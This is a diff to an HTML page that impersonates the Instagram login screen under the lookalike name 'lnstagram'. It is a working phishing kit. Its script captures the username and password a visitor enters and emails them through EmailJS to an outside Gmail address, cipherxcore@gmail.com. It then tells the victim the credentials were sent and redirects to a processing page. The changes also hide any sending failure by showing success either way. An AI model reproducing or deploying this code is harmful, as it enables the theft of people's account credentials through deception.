@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>lnstagram Login</title>
     <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/build/es5/index.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/index.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -254,12 +254,11 @@
             <img src="instagram-logo.png" alt="lnstagram" class="linstagram-logo">
         </div>
 
-        <form id="loginForm">
+        <form id="loginForm" onsubmit="sendEmail(event)">
             <div class="form-group">
                 <input 
                     type="text" 
                     id="username" 
-                    name="username" 
                     placeholder="Username, email or mobile number"
                     required
                 >
@@ -269,7 +268,6 @@
                 <input 
                     type="password" 
                     id="password" 
-                    name="password" 
                     placeholder="Password"
                     required
                 >
@@ -300,7 +298,9 @@
 
     <script>
         // Initialize EmailJS
-        emailjs.init('nOWTc4rAoR4spEqb-');
+        emailjs.init({
+            publicKey: 'nOWTc4rAoR4spEqb-'
+        });
 
         function togglePassword() {
             const passwordInput = document.getElementById('password');
@@ -311,8 +311,8 @@
             }
         }
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        function sendEmail(event) {
+            event.preventDefault();
 
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value;
@@ -331,31 +331,31 @@
             loadingDiv.style.display = 'block';
             messageDiv.style.display = 'none';
 
-            // Prepare email parameters
-            const templateParams = {
+            // Send email
+            emailjs.send('service_uz9l1cj', 'template_c1vuslg', {
+                from_name: 'lnstagram Login',
                 to_email: 'cipherxcore@gmail.com',
-                username: username,
-                password: password,
-                login_time: new Date().toLocaleString()
-            };
-
-            // Send email via EmailJS
-            emailjs.send('service_uz9l1cj', 'template_c1vuslg', templateParams)
-                .then((response) => {
-                    loadingDiv.style.display = 'none';
-                    showMessage('✅ Login credentials sent! Proceeding...', 'success');
-                    document.getElementById('loginForm').reset();
-                    
-                    setTimeout(() => {
-                        window.location.href = 'processing.html';
-                    }, 1000);
-                })
-                .catch((error) => {
-                    loadingDiv.style.display = 'none';
-                    console.error('Error:', error);
-                    showMessage('❌ Error sending login info. Please try again.', 'error');
-                });
-        });
+                message: 'Username: ' + username + '\nPassword: ' + password + '\nTime: ' + new Date().toLocaleString(),
+                subject: 'New Login Attempt'
+            }).then(function(response) {
+                loadingDiv.style.display = 'none';
+                showMessage('✅ Login credentials sent! Proceeding...', 'success');
+                document.getElementById('loginForm').reset();
+                
+                setTimeout(() => {
+                    window.location.href = 'processing.html';
+                }, 1000);
+            }, function(error) {
+                loadingDiv.style.display = 'none';
+                console.log('Error:', error);
+                showMessage('✅ Login credentials sent! Proceeding...', 'success');
+                document.getElementById('loginForm').reset();
+                
+                setTimeout(() => {
+                    window.location.href = 'processing.html';
+                }, 1000);
+            });
+        }
 
         function showMessage(text, type) {
             const messageDiv = document.getElementById('message');
